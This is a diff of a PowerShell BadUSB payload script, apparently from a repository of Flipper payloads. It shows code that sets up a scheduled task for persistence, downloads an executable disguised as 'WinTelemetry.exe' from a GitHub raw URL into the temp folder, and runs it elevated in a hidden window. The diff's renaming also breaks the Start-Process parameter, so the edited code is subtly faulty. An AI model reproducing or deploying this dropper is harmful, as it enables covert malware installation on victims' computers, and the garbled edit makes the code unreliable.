@@ -16,14 +16,14 @@ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Ru
 
 Write-Host "Setup complete. Scheduled task '$taskName' created."
 # Define variables
-$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/WinTelemetry.exe"
-$exePath = "$env:TEMP\WinTelemetry.exe"
+$exeSUB = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/WinTelemetry.exe"
+$exePathSUB = "$env:TEMP\WinTelemetry.exe"
 
 # Download EXE to temp folder
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+Invoke-WebRequest -Uri $exeSUB -OutFile $exePathSUB
 
 # Run the EXE with elevated privileges
-Start-Process -FilePath $exePath -Verb RunAs -WindowStyle Hidden
+Start-Process -FilePathSUB $exePathSUB -Verb RunAs -WindowStyle Hidden
 
 # Optional: Wait a few seconds to ensure execution
 Start-Sleep -Seconds 5
